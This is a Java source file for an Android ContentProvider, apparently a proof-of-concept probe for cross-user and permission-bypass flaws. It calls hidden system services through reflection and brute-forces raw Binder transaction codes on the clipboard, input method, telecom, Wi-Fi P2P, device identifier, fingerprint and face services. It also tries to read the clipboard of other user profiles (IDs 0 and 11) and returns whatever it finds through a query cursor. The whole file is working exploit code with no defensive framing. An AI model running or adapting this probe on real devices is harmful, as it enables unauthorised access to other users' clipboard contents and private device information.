package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.Context;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class FinalProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("clipboard")) {
            probeClipboard(cursor);
        } else if (path != null && path.contains("input")) {
            probeInputMethod(cursor);
        } else if (path != null && path.contains("wifi")) {
            probeWifiInfo(cursor);
        } else if (path != null && path.contains("telecom")) {
            probeTelecom(cursor);
        } else if (path != null && path.contains("device_identity")) {
            probeDeviceIdentity(cursor);
        } else {
            probeClipboard(cursor);
            probeInputMethod(cursor);
            probeWifiInfo(cursor);
            probeTelecom(cursor);
            probeDeviceIdentity(cursor);
        }

        return cursor;
    }

    private void probeClipboard(MatrixCursor cursor) {
        // Test via ClipboardManager API
        try {
            ClipboardManager cm = (ClipboardManager) getContext().getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    cursor.addRow(new Object[]{"clipboard_api",
                        "HAS_DATA: " + (text != null ? truncate(text.toString()) : "non-text")});
                } else {
                    cursor.addRow(new Object[]{"clipboard_api", "empty clip"});
                }
            } else {
                cursor.addRow(new Object[]{"clipboard_api", "no clip"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"clipboard_api", "ERR:" + truncate(e.getMessage())});
        }

        // Test via Binder - IClipboard
        IBinder binder = getServiceBinder("clipboard");
        if (binder == null) { cursor.addRow(new Object[]{"clipboard_binder", "no_binder"}); return; }
        String desc = "android.content.IClipboard";

        // IClipboard TX scan
        for (int tx = 1; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null); // attributionTag
                data.writeInt(0); // userId
                data.writeInt(0); // deviceId
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"clip_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"clip_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"clip_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // Try cross-user clipboard access
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                data.writeInt(userId);
                data.writeInt(0);
                // TX=2 is typically getPrimaryClip
                binder.transact(2, data, reply, 0);
                reply.readException();
                int marker = reply.readInt();
                if (marker != 0) {
                    cursor.addRow(new Object[]{"clip_u" + userId, "GOT_CLIP! (ClipData present)"});
                } else {
                    cursor.addRow(new Object[]{"clip_u" + userId, "null"});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"clip_u" + userId, "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"clip_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeInputMethod(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("input_method");
        if (binder == null) { cursor.addRow(new Object[]{"input_method", "no_binder"}); return; }
        String desc = "com.android.internal.view.IInputMethodManager";

        // IInputMethodManager:
        // TX=7: getInputMethodList(userId, directBootAwareness) — reveals installed IMEs
        // TX=8: getEnabledInputMethodList(userId) — reveals enabled IMEs
        // TX=11: getCurrentInputMethodInfo(userId) — active IME

        // TX=7: getInputMethodList for user 0 and 11
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                data.writeInt(0); // directBootAwareness
                binder.transact(7, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                if (avail > 4) {
                    cursor.addRow(new Object[]{"imeList_u" + userId,
                        "GOT_DATA avail=" + avail + " (installed IMEs for user " + userId + ")"});
                } else {
                    cursor.addRow(new Object[]{"imeList_u" + userId, "empty"});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"imeList_u" + userId, "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"imeList_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=11: getCurrentInputMethodInfo
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(11, data, reply, 0);
                reply.readException();
                int marker = reply.readInt();
                if (marker != 0) {
                    cursor.addRow(new Object[]{"curIME_u" + userId,
                        "GOT_DATA (active IME info for user " + userId + ")"});
                } else {
                    cursor.addRow(new Object[]{"curIME_u" + userId, "null"});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"curIME_u" + userId, "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"curIME_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeWifiInfo(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("wifip2p");
        if (binder == null) { cursor.addRow(new Object[]{"wifip2p", "no_binder"}); return; }
        String desc = "android.net.wifi.p2p.IWifiP2pManager";

        // IWifiP2pManager TX scan
        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeStrongBinder(new Binder()); // messenger binder
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"p2p_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        String msg = e.getMessage();
                        if (msg != null && (msg.contains("NEARBY") || msg.contains("LOCATION"))) {
                            cursor.addRow(new Object[]{"p2p_tx" + tx, "needs_NEARBY/LOCATION"});
                        } else {
                            cursor.addRow(new Object[]{"p2p_tx" + tx, "SEC:" + truncate(msg)});
                        }
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"p2p_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // Also try wifi service
        IBinder wifiBinder = getServiceBinder("wifiscanner");
        if (wifiBinder != null) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("android.net.wifi.IWifiScanner");
                data.writeStrongBinder(new Binder());
                data.writeString(getContext().getPackageName());
                wifiBinder.transact(1, data, reply, 0);
                reply.readException();
                cursor.addRow(new Object[]{"wifiscanner", "OK avail=" + reply.dataAvail()});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wifiscanner", "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeTelecom(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("telecom");
        if (binder == null) { cursor.addRow(new Object[]{"telecom", "no_binder"}); return; }
        String desc = "com.android.internal.telecom.ITelecomService";

        // ITelecomService interesting methods:
        // getDefaultDialerPackage — reveals default dialer
        // getSystemDialerPackage — reveals system dialer
        // getPhoneAccountsSupportingScheme — reveals VoIP apps
        // isInCall — reveals phone call state
        // isRinging — reveals ringing state

        // TX scan for accessible info
        int[] txCodes = {3, 4, 5, 6, 7, 8, 20, 21, 22, 23, 24, 25, 30, 31, 32, 33, 34, 35, 40};
        for (int tx : txCodes) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            // Try to read as string (many telecom methods return strings)
                            String val = null;
                            try {
                                int pos = reply.dataPosition();
                                val = reply.readString();
                                if (val == null || val.isEmpty()) {
                                    reply.setDataPosition(pos);
                                    int intVal = reply.readInt();
                                    cursor.addRow(new Object[]{"tel_tx" + tx, "int=" + intVal});
                                    continue;
                                }
                            } catch (Exception ignored) {}
                            if (val != null) {
                                cursor.addRow(new Object[]{"tel_tx" + tx, "str=" + truncate(val)});
                            } else {
                                cursor.addRow(new Object[]{"tel_tx" + tx, "OK avail=" + avail});
                            }
                        }
                    } catch (SecurityException e) {
                        // skip
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"tel_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeDeviceIdentity(MatrixCursor cursor) {
        // Try to read device identifiers through various paths
        IBinder binder = getServiceBinder("device_identifiers");
        if (binder != null) {
            cursor.addRow(new Object[]{"device_identifiers", "service_exists"});
            // TX scan
            String desc = "android.os.IDeviceIdentifiersPolicyService";
            for (int tx = 1; tx <= 5; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeString(getContext().getPackageName());
                    data.writeString(null);
                    boolean result = binder.transact(tx, data, reply, 0);
                    if (result) {
                        try {
                            reply.readException();
                            int avail = reply.dataAvail();
                            if (avail > 0) {
                                cursor.addRow(new Object[]{"devid_tx" + tx, "OK avail=" + avail});
                            }
                        } catch (Exception e) {
                            cursor.addRow(new Object[]{"devid_tx" + tx, truncate(e.getMessage())});
                        }
                    }
                } catch (Exception e) {}
                data.recycle();
                reply.recycle();
            }
        } else {
            cursor.addRow(new Object[]{"device_identifiers", "no_binder"});
        }

        // Try fingerprint service - can we detect enrolled fingerprints?
        IBinder fpBinder = getServiceBinder("fingerprint");
        if (fpBinder != null) {
            String desc = "android.hardware.fingerprint.IFingerprintService";
            // TX scan - looking for hasEnrolledFingerprints, getEnrolledFingerprints
            for (int tx = 1; tx <= 15; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeInt(0); // userId
                    data.writeString(getContext().getPackageName());
                    data.writeString(null);
                    boolean result = fpBinder.transact(tx, data, reply, 0);
                    if (result) {
                        try {
                            reply.readException();
                            int avail = reply.dataAvail();
                            if (avail > 0) {
                                cursor.addRow(new Object[]{"fp_tx" + tx, "OK avail=" + avail});
                            }
                        } catch (SecurityException e) {
                            // skip
                        } catch (Exception e) {
                            String msg = e.getMessage();
                            if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                                cursor.addRow(new Object[]{"fp_tx" + tx, truncate(msg)});
                            }
                        }
                    }
                } catch (Exception e) {}
                data.recycle();
                reply.recycle();
            }
        }

        // Try face service
        IBinder faceBinder = getServiceBinder("face");
        if (faceBinder != null) {
            String desc = "android.hardware.face.IFaceService";
            for (int tx = 1; tx <= 15; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeInt(0); // userId
                    data.writeString(getContext().getPackageName());
                    boolean result = faceBinder.transact(tx, data, reply, 0);
                    if (result) {
                        try {
                            reply.readException();
                            int avail = reply.dataAvail();
                            if (avail > 0) {
                                cursor.addRow(new Object[]{"face_tx" + tx, "OK avail=" + avail});
                            }
                        } catch (SecurityException e) {
                            // skip
                        } catch (Exception e) {
                            String msg = e.getMessage();
                            if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                                cursor.addRow(new Object[]{"face_tx" + tx, truncate(msg)});
                            }
                        }
                    }
                } catch (Exception e) {}
                data.recycle();
                reply.recycle();
            }
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
